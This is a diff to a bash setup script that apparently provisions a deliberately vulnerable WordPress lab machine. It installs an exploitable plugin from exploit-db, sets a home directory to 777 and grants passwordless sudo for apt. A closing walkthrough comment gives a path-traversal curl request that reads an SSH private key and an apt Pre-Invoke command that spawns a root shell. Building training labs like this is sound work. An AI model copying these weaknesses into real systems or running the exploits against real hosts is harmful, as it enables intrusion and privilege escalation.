@@ -57,6 +57,20 @@ makeWWW(){
         	Require all granted
     	</Directory>
 		</VirtualHost>' > /etc/apache2/sites-available/wordpress.conf
+	sudo -u steve echo '
+		# BEGIN WordPress
+		RewriteEngine On
+		RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+		RewriteBase /
+		RewriteRule ^index\.php$ - [L]
+		RewriteCond %{REQUEST_FILENAME} !-f
+		RewriteCond %{REQUEST_FILENAME} !-d
+		RewriteRule . /index.php [L]
+		<Files xmlrpc.php>
+		Order Allow,Deny
+		Deny from all
+		</Files>
+		# END WordPress' > /srv/www/wordpress/.htaccess
 }
 
 mysqlStuff(){
@@ -80,11 +94,11 @@ wordPress(){
 
 moreWordpress(){
 	cd /srv/www/wordpress/wp-content/plugins
-	wget https://downloads.wordpress.org/plugin/disable-xml-rpc.1.0.1.zip
-	unzip disable-xml-rpc.1.0.1.zip
-	wp plugin activate disable-xml-rpc
-	wget https://www.exploit-db.com/apps/5be8270e880c445e11c59597497468bb-site-editor.zip
-	unzip 5be8270e880c445e11c59597497468bb-site-editor.zip
+	#wget https://downloads.wordpress.org/plugin/disable-xml-rpc.1.0.1.zip
+	#unzip disable-xml-rpc.1.0.1.zip
+	#sudo -u steve wp plugin activate disable-xml-rpc
+	wget https://www.exploit-db.com/apps/942d7fab9b7c9ecc8318e8f7a88d52fb-old-post-spinner.zip
+	unzip 942d7fab9b7c9ecc8318e8f7a88d52fb-old-post-spinner.zip
 	rm *.zip
 	cd /tmp;sudo curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 	chmod +x wp-cli.phar
@@ -93,8 +107,9 @@ moreWordpress(){
 	rm -rf wp-content/plugins/akismet
 	sudo -u steve wp core install --url=$dnsname --title="Super Real Site" --admin_user=steve --admin_email='steve@localhost.com' 1>/root/wordpressadmin.txt
 	sleep 2
-	sudo -u steve wp post create --post_title="New Update to Super Real Site!" --post_content="We’re proud to announce that we’ve recently installed new plugins to help our collaborators make the most out of this website. Don’t forget to try them out!" --post_status=publish
-	#sudo -u steve wp post create --post_title="Be Aggressive! B. E. Agressive!" --post_content="The UM cheerleaders have finally brought home the gold thanks to their agressive efforts. We could all learn a thing or two about being aggressive from this team. Whenever you're just looking around you should try being aggressive too!" --post_status=publish
+	sudo -u steve wp post create --post_title="New Update to Super Real Site!" --post_content="Our brand new admin Steve recently installed new plugins to help our collaborators make the most out of this website. Make sure you find them and don’t forget to try them out!" --post_status=publish
+	sudo -u steve wp comment create --comment_author=steve --comment_content="I'm still not sure how to set my home permissions correctly. I think they're too open. Can someone help me?" --comment_post_ID=4
+	#sudo -u steve wp post create --post_title="Be Aggressive! B. E. Agressive!" --post_content="The UM cheerleaders have finally brought home the gold thanks to their aggressive efforts. We could all learn a thing or two about being aggressive from this team. Whenever you're just looking around you should try being aggressive too!" --post_status=publish
 	sudo -u steve wp post delete 1
 }
 
@@ -104,11 +119,10 @@ userStuff(){
 	echo "steve ALL=(root) NOPASSWD: /usr/bin/apt update *" >> /etc/sudoers
 	sudo -u steve mkdir /home/steve/.ssh
 	sudo -u steve ssh-keygen -f /home/steve/.ssh/id_rsa -N ""
-	systemctl reload sshd
 	echo -ne "$dnsname root"|md5sum > /root/proof.txt
 	echo -ne "$dnsname local"|md5sum > /home/steve/local.txt
 	echo -e "Hey Steve,\ndon't forget that it's your job to run the weekly update on this machine.\nYou'll have to do it manually.\nMake sure you get it done since I already gave you permission.  -admin" > /home/steve/admin_note.txt
-	chmod 644 /home/steve/admin_note.txt
+	chmod -R 777 /home/steve
 
 }
 
@@ -137,9 +151,9 @@ usermod -s /sbin/nologin ubuntu
 # Walkthrough
 # nmap -sCV from internal IP finds 22 and wordpress site on 80
 # wpscan --url http:// site --plugins-detection aggressive
-# finds site-editor plugin
+# finds WordPress Plugin OPS Old Post Spinner 2.2.1
 # LFI on plugin /etc/passwd finds cleartext password
-# curl http:// site /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+# curl http:// site /wp-content/plugins/old-post-spinner/logview.php?ops_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/home/steve/.ssh/id_rsa
 # ssh in as steve
 # sudo -l finds apt usage
 # sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
